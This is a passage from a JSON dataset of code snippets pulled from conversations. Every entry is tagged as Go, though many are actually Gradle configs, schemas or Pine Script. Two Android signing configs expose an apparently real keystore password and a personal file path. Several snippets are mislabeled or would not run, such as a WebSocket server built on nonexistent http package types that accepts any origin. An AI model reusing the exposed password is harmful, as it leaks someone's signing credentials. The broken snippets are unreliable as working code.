\"emoji_id\", \"type\": \"long\"}\n        ]\n    }\n]",
    "filename": "4494d4198e4ed0aaa6d758ec58dc6bb9_0.go"
  },
  {
    "conversation_hash": "4494d4198e4ed0aaa6d758ec58dc6bb9",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "[\n    {\n        \"name\": \"User\",\n        \"type\": \"record\",\n        \"logicalType\": \"Entity\",\n        \"fields\": [\n            {\"name\": \"id\", \"type\": \"long\", \"index\": true},\n            {\"name\": \"username\", \"type\": \"string\"},\n            {\"name\": \"first_name\", \"type\": \"string\"},\n            {\"name\": \"last_name\", \"type\": \"string\"}\n        ]\n    },\n    {\n        \"name\": \"Emoji\",\n        \"type\": \"record\",\n        \"logicalType\": \"Aggregate\",\n        \"fields\": [\n            {\"name\": \"id\", \"type\": \"long\", \"index\": true},\n            {\"name\": \"user_id\", \"type\": \"long\", \"index\": true}\n        ]\n    },\n    {\n        \"name\": \"Article\",\n        \"type\": \"record\",\n        \"logicalType\": \"Aggregate\",\n        \"fields\": [\n            {\"name\": \"id\", \"type\": \"long\", \"index\": true},\n            {\"name\": \"title\", \"type\": \"string\"},\n            {\"name\": \"author\", \"type\": \"string\"},\n            {\"name\": \"date_published\", \"type\": \"string\"},\n            {\"name\": \"content\", \"type\": \"string\"},\n            {\"name\": \"tags\", \"type\": {\"type\": \"array\", \"items\" : \"string\"}},\n            {\"name\": \"emoji_id\", \"type\": \"long\", \"index\": true}\n        ]\n    }\n]",
    "filename": "4494d4198e4ed0aaa6d758ec58dc6bb9_1.go"
  },
  {
    "conversation_hash": "eea40968c6717e438816cd269d32c98d",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "android {\n    ...\n    signingConfigs {\n        release {\n            storeFile file('<keystore_file_path>')\n            storePassword '<keystore_password>'\n            keyAlias '<key_alias>'\n            keyPassword '<key_password>'\n        }\n    }\n    ...\n}",
    "filename": "eea40968c6717e438816cd269d32c98d_1.go"
  },
  {
    "conversation_hash": "eea40968c6717e438816cd269d32c98d",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
    "code": "android {\n    ...\n    buildTypes {\n        release {\n            ...\n            signingConfig signingConfigs.release\n        }\n    }\n    ...\n}",
    "filename": "eea40968c6717e438816cd269d32c98d_2.go"
  },
  {
    "conversation_hash": "eea40968c6717e438816cd269d32c98d",
    "code_index": 4,
    "language": "Go",
    "libraries": [],
    "code": "android {\n    ...\n    buildTypes {\n        release {\n            ...\n            signingConfig signingConfigs.release\n        }\n    }\n    ...\n}",
    "filename": "eea40968c6717e438816cd269d32c98d_4.go"
  },
  {
    "conversation_hash": "eea40968c6717e438816cd269d32c98d",
    "code_index": 7,
    "language": "Go",
    "libraries": [],
    "code": "android {\n    ...\n    signingConfigs {\n        release {\n            storeFile file('C:/Users/noura/source/repos/receipe app/my-release-key.jks')\n            storePassword 'monorfasa'\n            keyAlias 'your_key_alias'\n            keyPassword 'monorfasa'\n        }\n    }\n    ...\n}",
    "filename": "eea40968c6717e438816cd269d32c98d_7.go"
  },
  {
    "conversation_hash": "eea40968c6717e438816cd269d32c98d",
    "code_index": 8,
    "language": "Go",
    "libraries": [],
    "code": "android {\n    ...\n    signingConfigs {\n        release {\n            storeFile file('C:/Users/noura/source/repos/receipe app/my-release-key.jks')\n            storePassword 'monorfasa'\n            keyAlias 'my_alias'\n            keyPassword 'monorfasa'\n        }\n    }\n    ...\n}",
    "filename": "eea40968c6717e438816cd269d32c98d_8.go"
  },
  {
    "conversation_hash": "b4cd93f30bf110c6fdbcf0db79b282ce",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
    "code": "// Create a sample Node and populate its fields\nnode := &Node{\n  ENodeB: make(map[string]*ENodeB),\n  EUtranCellData: make(map[string]*EUtranCellData),\n}\n\n// Create an ENodeB and add it to the Node\neNodeB := &ENodeB{ /* ENodeB properties */ }\nnode.ENodeB[\"eNodeB1\"] = eNodeB\n\n// Create an EUtranCellData and add it to the Node\neuCellData := &EUtranCellData{ /* EUtranCellData properties */ }\nnode.EUtranCellData[\"cellData1\"] = euCellData\n\n// Create a Nodes instance and add the Node to it\nnodes := &Nodes{\n  Nodes: make(map[string]*Node),\n}\nnodes.Nodes[\"node1\"] = node",
    "filename": "b4cd93f30bf110c6fdbcf0db79b282ce_2.go"
  },
  {
    "conversation_hash": "b4cd93f30bf110c6fdbcf0db79b282ce",
    "code_index": 3,
    "language": "Go",
    "libraries": [],
    "code": "type Node struct {\n\tENodeB         *ENodeB\n\tEUtranCellData *EUtranCellData\n}\n\ntype Nodes struct {\n\tNodes map[string]*Node\n}",
    "filename": "b4cd93f30bf110c6fdbcf0db79b282ce_3.go"
  },
  {
    "conversation_hash": "b4cd93f30bf110c6fdbcf0db79b282ce",
    "code_index": 4,
    "language": "Go",
    "libraries": [],
    "code": "// Create sample ENodeB and EUtranCellData instances\neNodeB := &ENodeB{ /* ENodeB properties */ }\neuCellData := &EUtranCellData{ /* EUtranCellData properties */ }\n\n// Create a Node instance and populate its fields\nnode := &Node{\n\tENodeB:         eNodeB,\n\tEUtranCellData: euCellData,\n}\n\n// Create a Nodes instance and add the Node to it\nnodes := &Nodes{\n\tNodes: map[string]*Node{\n\t\t\"node1\": node,\n\t},\n}",
    "filename": "b4cd93f30bf110c6fdbcf0db79b282ce_4.go"
  },
  {
    "conversation_hash": "b4cd93f30bf110c6fdbcf0db79b282ce",
    "code_index": 5,
    "language": "Go",
    "libraries": [],
    "code": "// Create valid ENodeB and EUtranCellData instances\neNodeB1 := &ENodeB{}\neuCellData1 := &EUtranCellData{}\n\neNodeB2 := &ENodeB{}\neuCellData2 := &EUtranCellData{}\n\n// Create valid Node instances\nnode1 := &Node{\n\tENodeB:         eNodeB1,\n\tEUtranCellData: euCellData1,\n}\n\nnode2 := &Node{\n\tENodeB:         eNodeB2,\n\tEUtranCellData: euCellData2,\n}\n\n// Create a Nodes instance and add the Node to it\nnodes := &Nodes{\n\tNodes: map[string]*Node{\n\t\t\"node1\": node1,\n\t\t\"node2\": node2,\n\t},\n}",
    "filename": "b4cd93f30bf110c6fdbcf0db79b282ce_5.go"
  },
  {
    "conversation_hash": "b4cd93f30bf110c6fdbcf0db79b282ce",
    "code_index": 6,
    "language": "Go",
    "libraries": [],
    "code": "// Create valid ENodeB and EUtranCellData instances\neNodeB1 := &ENodeB{}\neuCellData1 := &EUtranCellData{}\n\neNodeB2 := &ENodeB{}\neuCellData2 := &EUtranCellData{}\n\n// Create valid Node instances\nnode1 := &Node{\n\tENodeB:         eNodeB1,\n\tEUtranCellData: euCellData1,\n}\n\nnode2 := &Node{\n\tENodeB:         eNodeB2,\n\tEUtranCellData: euCellData2,\n}\n\n// Create a Nodes instance and add the Node to it\nnodes := &Nodes{\n\tNodes: map[string]*Node{\n\t\t\"node1\": node1,\n\t\t\"node2\": node2,\n\t},\n}",
    "filename": "b4cd93f30bf110c6fdbcf0db79b282ce_6.go"
  },
  {
    "conversation_hash": "b4cd93f30bf110c6fdbcf0db79b282ce",
    "code_index": 7,
    "language": "Go",
    "libraries": [],
    "code": "type Node struct {\n\tENodeB         *ENodeB\n\tEUtranCellData *EUtranCellData\n}\n\ntype Nodes map[string]*Node\n\nfunc main() {\n\t// Create valid ENodeB and EUtranCellData instances\n\teNodeB1 := &ENodeB{}\n\teuCellData1 := &EUtranCellData{}\n\n\teNodeB2 := &ENodeB{}\n\teuCellData2 := &EUtranCellData{}\n\n\t// Create valid Node instances\n\tnode1 := &Node{\n\t\tENodeB:         eNodeB1,\n\t\tEUtranCellData: euCellData1,\n\t}\n\n\tnode2 := &Node{\n\t\tENodeB:         eNodeB2,\n\t\tEUtranCellData: euCellData2,\n\t}\n\n\t// Create a Nodes instance and add the Node to it\n\tnodes := Nodes{\n\t\t\"node1\": node1,\n\t\t\"node2\": node2,\n\t}\n}",
    "filename": "b4cd93f30bf110c6fdbcf0db79b282ce_7.go"
  },
  {
    "conversation_hash": "b4cd93f30bf110c6fdbcf0db79b282ce",
    "code_index": 8,
    "language": "Go",
    "libraries": [],
    "code": "// ValidateNodes validates the Nodes\nfunc (nodes *Nodes) Validate() error {\n\tfor name, node := range *nodes {\n\t\tif err := node.ValidateNode(); err != nil {\n\t\t\treturn validation.Errors{\n\t\t\t\tname: err,\n\t\t\t}\n\t\t}\n\t}\n\treturn nil\n}",
    "filename": "b4cd93f30bf110c6fdbcf0db79b282ce_8.go"
  },
  {
    "conversation_hash": "b4cd93f30bf110c6fdbcf0db79b282ce",
    "code_index": 9,
    "language": "Go",
    "libraries": [],
    "code": "// ValidateNodes validates the Nodes\nfunc (nodes *Nodes) Validate() error {\n\tfor name, node := range *nodes {\n\t\tif err := node.ValidateNode(); err != nil {\n\t\t\treturn validation.Errors{\n\t\t\t\tname: err,\n\t\t\t}\n\t\t}\n\t}\n\treturn nil\n}",
    "filename": "b4cd93f30bf110c6fdbcf0db79b282ce_9.go"
  },
  {
    "conversation_hash": "302a312b6f418db3d459f8ba7624911c",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "// Top-level build.gradle\n\nbuildscript {\n    repositories {\n        google()\n        jcenter()\n    }\n    dependencies {\n        classpath 'com.android.tools.build:gradle:4.1.3'\n    }\n}\n\nallprojects {\n    repositories {\n        google()\n        jcenter()\n    }\n}",
    "filename": "302a312b6f418db3d459f8ba7624911c_1.go"
  },
  {
    "conversation_hash": "302a312b6f418db3d459f8ba7624911c",
    "code_index": 3,
    "language": "Go",
    "libraries": [],
    "code": "buildscript {\n    repositories {\n        google()\n        jcenter()\n    }\n    dependencies {\n        classpath \"org.jetbrains.kotlin:kotlin-gradle-plugin:1.6.0\"\n        // Add other dependencies as needed\n    }\n}",
    "filename": "302a312b6f418db3d459f8ba7624911c_3.go"
  },
  {
    "conversation_hash": "302a312b6f418db3d459f8ba7624911c",
    "code_index": 4,
    "language": "Go",
    "libraries": [],
    "code": "buildscript {\n    repositories {\n        google()\n        jcenter()\n    }\n    dependencies {\n        classpath \"com.android.tools.build:gradle:4.1.3\"\n        // Other dependencies...\n    }\n}",
    "filename": "302a312b6f418db3d459f8ba7624911c_4.go"
  },
  {
    "conversation_hash": "d0b7f8fd5fd83f6bcaea93348bd64e4c",
    "code_index": 3,
    "language": "Go",
    "libraries": [],
    "code": "plugins {\n    id 'com.android.application'\n    id 'com.divpundir.mavlink.generator' version '0.5.0'\n}\n\nandroid {\n    compileSdkVersion 33\n    buildToolsVersion \"33.0.0\"\n\n    // Rest of your android block configuration\n    // ...\n}\n\n// Rest of your build.gradle file\n// ...",
    "filename": "d0b7f8fd5fd83f6bcaea93348bd64e4c_3.go"
  },
  {
    "conversation_hash": "d0b7f8fd5fd83f6bcaea93348bd64e4c",
    "code_index": 5,
    "language": "Go",
    "libraries": [],
    "code": "plugins {\n    id 'com.android.application'\n    id 'maven'\n    id 'com.divpundir.mavlink.generator' version '0.5.0'\n}\n\nandroid {\n    compileSdkVersion 33\n    buildToolsVersion \"33.0.0\"\n\n    // Rest of your android block configuration\n    // ...\n}\n\n// Rest of your build.gradle file\n// ...",
    "filename": "d0b7f8fd5fd83f6bcaea93348bd64e4c_5.go"
  },
  {
    "conversation_hash": "d2797d0c22d1243418507bba559f80fc",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"io\"\n\t\"log\"\n\t\"os\"\n)\n\nfunc readFileInChunks(filePath string, chunkSize int) error {\n\tfile, err := os.Open(filePath)\n\tif err != nil {\n\t\treturn err\n\t}\n\tdefer file.Close()\n\n\tbuffer := make([]byte, chunkSize)\n\tfor {\n\t\tn, err := file.Read(buffer)\n\t\tif err != nil && err != io.EOF {\n\t\t\treturn err\n\t\t}\n\t\tif n == 0 {\n\t\t\tbreak\n\t\t}\n\t\t// Process the chunk here\n\t\tfmt.Printf(\"Processing %d bytes\\n\", n)\n\t}\n\n\treturn nil\n}\n\nfunc main() {\n\tfilePath := \"path/to/your/file.ext\"\n\tchunkSize := 512 * 1024\n\n\terr := readFileInChunks(filePath, chunkSize)\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n}",
    "filename": "d2797d0c22d1243418507bba559f80fc_1.go"
  },
  {
    "conversation_hash": "d2797d0c22d1243418507bba559f80fc",
    "code_index": 3,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"log\"\n\t\"os\"\n)\n\nfunc readFileInStream(filePath string, chunkSize int) error {\n\tfile, err := os.Open(filePath)\n\tif err != nil {\n\t\treturn err\n\t}\n\tdefer file.Close()\n\n\tbuffer := make([]byte, chunkSize)\n\tfor {\n\t\tn, err := file.Read(buffer)\n\t\tif err != nil {\n\t\t\tlog.Fatal(err)\n\t\t}\n\t\tif n == 0 {\n\t\t\tbreak\n\t\t}\n\t\tprocessChunk(buffer[:n])\n\t}\n\n\treturn nil\n}\n\nfunc processChunk(chunk []byte) {\n\t// Process the chunk here\n\tfmt.Printf(\"Processing %d bytes\\n\", len(chunk))\n}\n\nfunc main() {\n\tfilePath := \"path/to/your/file.ext\"\n\tchunkSize := 512 * 1024\n\n\terr := readFileInStream(filePath, chunkSize)\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n}",
    "filename": "d2797d0c22d1243418507bba559f80fc_3.go"
  },
  {
    "conversation_hash": "75a8afbd34d0158422ad6a9e33005729",
    "code_index": 3,
    "language": "Go",
    "libraries": [],
    "code": "func wsHandler(w http.ResponseWriter, r *http.Request) {\n       conn, err := upgrader.Upgrade(w, r, nil)\n       if err != nil {\n           // Handle error\n           return\n       }\n\n       // Handle incoming and outgoing messages through the `conn` object\n   }",
    "filename": "75a8afbd34d0158422ad6a9e33005729_3.go"
  },
  {
    "conversation_hash": "75a8afbd34d0158422ad6a9e33005729",
    "code_index": 5,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"net/http\"\n\t\"strings\"\n)\n\ntype WebSocketServer struct {\n\tconnections map[*WebSocketClient]bool\n\tbroadcast   chan string\n}\n\ntype WebSocketClient struct {\n\tserver *WebSocketServer\n\tconn   *WebSocketConnection\n}\n\ntype WebSocketConnection struct {\n\tws   *WebSocketClient\n\tsend chan string\n}\n\nfunc (c *WebSocketConnection) reader() {\n\tfor {\n\t\tmessage, err := c.ws.conn.ReadMessage()\n\t\tif err != nil {\n\t\t\tbreak\n\t\t}\n\t\tc.ws.server.broadcast <- string(message)\n\t}\n\tc.ws.conn.Close()\n}\n\nfunc (c *WebSocketConnection) writer() {\n\tfor message := range c.send {\n\t\terr := c.ws.conn.WriteMessage(http.TextMessage, []byte(message))\n\t\tif err != nil {\n\t\t\tbreak\n\t\t}\n\t}\n\tc.ws.conn.Close()\n}\n\nfunc (wss *WebSocketServer) start() {\n\tfor {\n\t\tselect {\n\t\tcase conn := <-wss.broadcast:\n\t\t\tfor client := range wss.connections {\n\t\t\t\tclient.send <- conn\n\t\t\t}\n\t\t}\n\t}\n}\n\nfunc (wss *WebSocketServer) ServeHTTP(w http.ResponseWriter, r *http.Request) {\n\tconn, err := upgrader.Upgrade(w, r, nil)\n\tif err != nil {\n\t\thttp.Error(w, \"Could not open websocket connection\", http.StatusBadRequest)\n\t\treturn\n\t}\n\n\tclient := &WebSocketClient{\n\t\tserver: wss,\n\t\tconn: &WebSocketConnection{\n\t\t\tsend: make(chan string),\n\t\t},\n\t}\n\n\twss.connections[client] = true\n\n\tgo client.conn.writer()\n\tclient.conn.reader()\n}\n\nvar upgrader = &http.Upgrader{\n\tReadBufferSize:  1024,\n\tWriteBufferSize: 1024,\n\tCheckOrigin: func(r *http.Request) bool {\n\t\treturn true\n\t},\n}\n\nfunc main() {\n\tserver := &WebSocketServer{\n\t\tconnections: make(map[*WebSocketClient]bool),\n\t\tbroadcast:   make(chan string),\n\t}\n\tgo server.start()\n\n\thttp.HandleFunc(\"/ws\", server.ServeHTTP)\n\terr := http.ListenAndServe(\":8080\", nil)\n\tif err != nil {\n\t\tfmt.Println(\"Server error:\", err.Error())\n\t}\n}",
    "filename": "75a8afbd34d0158422ad6a9e33005729_5.go"
  },
  {
    "conversation_hash": "d0b0c547e5e04693351111c583362dc7",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"encoding/json\"\n\t\"fmt\"\n\t\"io/ioutil\"\n\t\"os\"\n)\n\nfunc main() {\n\t// 定义json数据\n\tdata := map[string]interface{}{\n\t\t\"name\":   \"John\",\n\t\t\"age\":    30,\n\t\t\"gender\": \"male\",\n\t}\n\n\t// 将json数据编码为二进制数据\n\tjsonData, err := json.Marshal(data)\n\tif err != nil {\n\t\tfmt.Println(\"JSON encoding error:\", err)\n\t\treturn\n\t}\n\n\t// 创建文件\n\tfile, err := os.Create(\"output.bin\")\n\tif err != nil {\n\t\tfmt.Println(\"File creation error:\", err)\n\t\treturn\n\t}\n\tdefer file.Close()\n\n\t// 将二进制数据写入文件\n\t_, err = file.Write(jsonData)\n\tif err != nil {\n\t\tfmt.Println(\"File write error:\", err)\n\t\treturn\n\t}\n\n\tfmt.Println(\"JSON data has been written to output.bin\")\n}",
    "filename": "d0b0c547e5e04693351111c583362dc7_0.go"
  },
  {
    "conversation_hash": "d0b0c547e5e04693351111c583362dc7",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"encoding/json\"\n\t\"fmt\"\n\t\"io/ioutil\"\n\t\"os\"\n)\n\nfunc main() {\n\t// 定义json数据\n\tdata := map[string]interface{}{\n\t\t\"name\":   \"John\",\n\t\t\"age\":    30,\n\t\t\"gender\": \"male\",\n\t}\n\n\t// 将json数据编码为二进制数据\n\tjsonData, err := json.Marshal(data)\n\tif err != nil {\n\t\tfmt.Println(\"JSON encoding error:\", err)\n\t\treturn\n\t}\n\n\t// 创建文件并将二进制数据写入文件\n\terr = ioutil.WriteFile(\"output.bin\", jsonData, 0644)\n\tif err != nil {\n\t\tfmt.Println(\"File write error:\", err)\n\t\treturn\n\t}\n\n\tfmt.Println(\"JSON data has been written to output.bin\")\n\n\t// 读取文件\n\tfileData, err := ioutil.ReadFile(\"output.bin\")\n\tif err != nil {\n\t\tfmt.Println(\"File read error:\", err)\n\t\treturn\n\t}\n\n\t// 解码二进制数据为json\n\tvar jsonData2 map[string]interface{}\n\terr = json.Unmarshal(fileData, &jsonData2)\n\tif err != nil {\n\t\tfmt.Println(\"JSON decoding error:\", err)\n\t\treturn\n\t}\n\n\t// 打印读取到的json数据\n\tfmt.Println(\"Read JSON data:\", jsonData2)\n}",
    "filename": "d0b0c547e5e04693351111c583362dc7_1.go"
  },
  {
    "conversation_hash": "8a0aef4feab15c262d669f2a1dc8bb60",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n    \"encoding/json\"\n    \"fmt\"\n    \"io/ioutil\"\n    \"os\"\n)\n\nfunc main() {\n    // JSON字符串\n    jsonStr := `{\"name\": \"John\", \"age\": 30, \"city\": \"New York\"}`\n\n    // 1. 以二进制形式写入文件并统计文件大小\n    binaryFile := \"data.bin\"\n    err := ioutil.WriteFile(binaryFile, []byte(jsonStr), 0644)\n    if err != nil {\n        fmt.Println(\"Failed to write binary file:\", err)\n        return\n    }\n    binaryFileSize, err := getFileSize(binaryFile)\n    if err != nil {\n        fmt.Println(\"Failed to get binary file size:\", err)\n    } else {\n        fmt.Println(\"Binary file size:\", binaryFileSize, \"bytes\")\n    }\n\n    // 2. 以JSON格式写入文件并统计文件大小\n    jsonFile := \"data.json\"\n    err = ioutil.WriteFile(jsonFile, []byte(jsonStr), 0644)\n    if err != nil {\n        fmt.Println(\"Failed to write JSON file:\", err)\n        return\n    }\n    jsonFileSize, err := getFileSize(jsonFile)\n    if err != nil {\n        fmt.Println(\"Failed to get JSON file size:\", err)\n    } else {\n        fmt.Println(\"JSON file size:\", jsonFileSize, \"bytes\")\n    }\n}\n\n// 获取文件大小\nfunc getFileSize(filename string) (int64, error) {\n    fileInfo, err := os.Stat(filename)\n    if err != nil {\n        return 0, err\n    }\n    return fileInfo.Size(), nil\n}",
    "filename": "8a0aef4feab15c262d669f2a1dc8bb60_1.go"
  },
  {
    "conversation_hash": "3a84ad59ca5b0e2545b458e0068d4bfa",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\n\tbt \"github.com/joeycumines/go-behaviortree\"\n)\n\nfunc main() {\n\t// Create the root node of the behavior tree\n\troot := bt.NewSelectorNode(\n\t\t\"Root\",\n\t\t// Add child nodes to the root\n\t\tbt.NewSequenceNode(\"Sequence\",\n\t\t\tbt.NewConditionNode(\"Condition1\", func() bool {\n\t\t\t\t// Perform some condition check here\n\t\t\t\treturn true\n\t\t\t}),\n\t\t\tbt.NewActionNode(\"Action1\", func() bt.Status {\n\t\t\t\t// Perform an action here\n\t\t\t\tfmt.Println(\"Performing Action1...\")\n\t\t\t\treturn bt.Success\n\t\t\t}),\n\t\t),\n\t\tbt.NewActionNode(\"Action2\", func() bt.Status {\n\t\t\t// Perform another action here\n\t\t\tfmt.Println(\"Performing Action2...\")\n\t\t\treturn bt.Success\n\t\t}),\n\t)\n\n\t// Execute the behavior tree\n\tstatus := root.Tick()\n\n\tif status == bt.Success {\n\t\tfmt.Println(\"Behavior tree executed successfully!\")\n\t} else if status == bt.Failure {\n\t\tfmt.Println(\"Behavior tree execution failed!\")\n\t} else if status == bt.Running {\n\t\tfmt.Println(\"Behavior tree execution is still running!\")\n\t} else {\n\t\tfmt.Println(\"Unknown status returned by behavior tree!\")\n\t}\n}",
    "filename": "3a84ad59ca5b0e2545b458e0068d4bfa_0.go"
  },
  {
    "conversation_hash": "16f3ecb50a93684a83be41d767b37f0c",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"encoding/json\"\n\t\"fmt\"\n\t\"os\"\n)\n\ntype Data struct {\n\tName  string `json:\"name\"`\n\tAge   int    `json:\"age\"`\n\tEmail string `json:\"email\"`\n}\n\nfunc main() {\n\t// 创建一个文件并打开\n\tfile, err := os.Create(\"output.json\")\n\tif err != nil {\n\t\tfmt.Println(\"Error creating file:\", err)\n\t\treturn\n\t}\n\tdefer file.Close()\n\n\t// 定义一千行数据\n\tvar jsonData []Data\n\tfor i := 0; i < 1000; i++ {\n\t\tdata := Data{\n\t\t\tName:  fmt.Sprintf(\"Name%d\", i),\n\t\t\tAge:   i,\n\t\t\tEmail: fmt.Sprintf(\"email%d@example.com\", i),\n\t\t}\n\t\tjsonData = append(jsonData, data)\n\t}\n\n\t// 将数据编码为json格式\n\tencoder := json.NewEncoder(file)\n\tfor _, data := range jsonData {\n\t\terr := encoder.Encode(data)\n\t\tif err != nil {\n\t\t\tfmt.Println(\"Error encoding data:\", err)\n\t\t\treturn\n\t\t}\n\t}\n\n\tfmt.Println(\"JSON data written to file successfully.\")\n}",
    "filename": "16f3ecb50a93684a83be41d767b37f0c_0.go"
  },
  {
    "conversation_hash": "16f3ecb50a93684a83be41d767b37f0c",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"bufio\"\n\t\"fmt\"\n\t\"os\"\n)\n\nfunc main() {\n\t// 打开文件\n\tfile, err := os.Open(\"large_file.txt\")\n\tif err != nil {\n\t\tfmt.Println(\"Error opening file:\", err)\n\t\treturn\n\t}\n\tdefer file.Close()\n\n\t// 创建一个bufio.Scanner来逐行读取文件内容\n\tscanner := bufio.NewScanner(file)\n\n\t// 遍历每一行数据\n\tfor scanner.Scan() {\n\t\tline := scanner.Text()\n\t\t// 在这里对每一行数据进行处理，如打印或其他操作\n\t\tfmt.Println(line)\n\t}\n\n\tif scanner.Err() != nil {\n\t\tfmt.Println(\"Error reading file:\", scanner.Err())\n\t\treturn\n\t}\n\n\tfmt.Println(\"File read successfully.\")\n}",
    "filename": "16f3ecb50a93684a83be41d767b37f0c_1.go"
  },
  {
    "conversation_hash": "a97b9e0e6b9bbb8ded8ad912f24036d8",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"encoding/json\"\n\t\"io/ioutil\"\n\t\"log\"\n)\n\nfunc main() {\n\t// 创建一个包含一千行的JSON对象\n\tdata := make([]map[string]interface{}, 1000)\n\tfor i := 0; i < 1000; i++ {\n\t\tdata[i] = map[string]interface{}{\n\t\t\t\"key\": i,\n\t\t}\n\t}\n\n\t// 将JSON对象编码为字节切片\n\tjsonData, err := json.Marshal(data)\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n\n\t// 将字节切片写入文件\n\terr = ioutil.WriteFile(\"output.json\", jsonData, 0644)\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n\n\tlog.Println(\"JSON data written to file\")\n}",
    "filename": "a97b9e0e6b9bbb8ded8ad912f24036d8_0.go"
  },
  {
    "conversation_hash": "a97b9e0e6b9bbb8ded8ad912f24036d8",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"bufio\"\n\t\"encoding/json\"\n\t\"log\"\n\t\"os\"\n)\n\ntype Item struct {\n\tKey int `json:\"key\"`\n}\n\nfunc main() {\n\t// 打开包含JSON数据的文件\n\tfile, err := os.Open(\"data.json\")\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n\tdefer file.Close()\n\n\t// 逐行读取JSON数据\n\tscanner := bufio.NewScanner(file)\n\tfor scanner.Scan() {\n\t\tline := scanner.Bytes()\n\n\t\t// 解码JSON对象\n\t\tvar item Item\n\t\tif err := json.Unmarshal(line, &item); err != nil {\n\t\t\tlog.Println(\"Error decoding JSON:\", err)\n\t\t} else {\n\t\t\t// 打印解码后的数据\n\t\t\tlog.Println(\"Key:\", item.Key)\n\t\t}\n\t}\n\n\tif err := scanner.Err(); err != nil {\n\t\tlog.Fatal(err)\n\t}\n}",
    "filename": "a97b9e0e6b9bbb8ded8ad912f24036d8_1.go"
  },
  {
    "conversation_hash": "a97b9e0e6b9bbb8ded8ad912f24036d8",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"bufio\"\n\t\"log\"\n\t\"os\"\n)\n\nfunc main() {\n\t// 打开大文件\n\tfile, err := os.Open(\"largefile.txt\")\n\tif err != nil {\n\t\tlog.Fatal(err)\n\t}\n\tdefer file.Close()\n\n\t// 创建Scanner对象\n\tscanner := bufio.NewScanner(file)\n\n\t// 设置Scanner的缓冲区大小\n\tbuf := make([]byte, 64*1024)  // 缓冲区大小为64KB\n\tscanner.Buffer(buf, bufio.MaxScanTokenSize)\n\n\t// 循环读取每行数据\n\tfor scanner.Scan() {\n\t\tline := scanner.Text()\n\n\t\t// 处理每行数据\n\t\t// 在这里可以对每行数据进行需要的操作\n\t\tlog.Println(line)\n\t}\n\n\tif err := scanner.Err(); err != nil {\n\t\tlog.Fatal(err)\n\t}\n}",
    "filename": "a97b9e0e6b9bbb8ded8ad912f24036d8_2.go"
  },
  {
    "conversation_hash": "fb5558201529d37482a8334c340d0710",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "//@version=4\nstrategy(\"Custom Backtest Fields\", overlay=false)\n\n// 定义回测字段\nvar float myCustomField = 0.0\n\n// 在每根K线上计算并更新回测字段的值\nif barstate.islast\n    myCustomField := close - open\n\n// 输出回测字段值\nplot(myCustomField, title=\"My Custom Field\", color=color.blue, linewidth=2)",
    "filename": "fb5558201529d37482a8334c340d0710_1.go"
  },
  {
    "conversation_hash": "fb5558201529d37482a8334c340d0710",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
    "code": "//@version=4\nstrategy(\"Custom Backtest Results\", overlay=false)\n\n// 定义变量来跟踪订单和胜利交易\nvar ordersCount = 0\nvar winningTradesCount = 0\n\n// 定义策略逻辑\nif condition\n    strategy.entry(\"Long\", strategy.long)\n    ordersCount := ordersCount + 1\n    if conditionForWinningTrade\n        winningTradesCount := winningTradesCount + 1\n\n// 在策略完成后输出结果\nif barstate.islast\n    // 计算胜率\n    winRate = winningTradesCount / ordersCount * 100\n\n    // 输出结果\n    strategy.equity\n    strategy.closedtrades\n    plot(ordersCount, title=\"Total Orders\")\n    plot(winRate, title=\"Win Rate (%)\")",
    "filename": "fb5558201529d37482a8334c340d0710_2.go"
  },
  {
    "conversation_hash": "91da32e185b389c590bf9ea43626d879",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
    "code": "// SetBaselineId sets baseline Id for certain integration job\nfunc (job *ElasticRan) SetBaselineId() int {\n\t//groups\n\tsubNet := job.ENodeB.SubNetwork.Name\n\tif subNet == \"LTE_Shymkent\" {\n\t\treturn 620\n\t} else if subNet == \"Shymkent\" {\n\t\treturn 620\n\t} else {\n\t\treturn 610\n\t}\n}",
    "filename": "91da32e185b389c590bf9ea43626d879_2.go"
  },
  {
    "conversation_hash": "91da32e185b389c590bf9ea43626d879",
    "code_index": 4,
    "language": "Go",
    "libraries": [],
    "code": "type IntegrLte interface {\n\tValidate() error\n\tConvertGps() error\n\tGetName() string\n\tGetSubType() string\n\tSetName(string)\n\tSetType(string)\n\tSetSubType(string)\n\tSetDir()\n\tSetBaselineId()\n\tSetMoshellPackage()\n\tSetMoshellLogFile(string)\n\tSetMoshellAutoIntegrFile(string)\n\tInitScript(string)\n\tPrepareScript(*template.Template) error\n}",
    "filename": "91da32e185b389c590bf9ea43626d879_4.go"
  },
  {
    "conversation_hash": "91da32e185b389c590bf9ea43626d879",
    "code_index": 5,
    "language": "Go",
    "libraries": [],
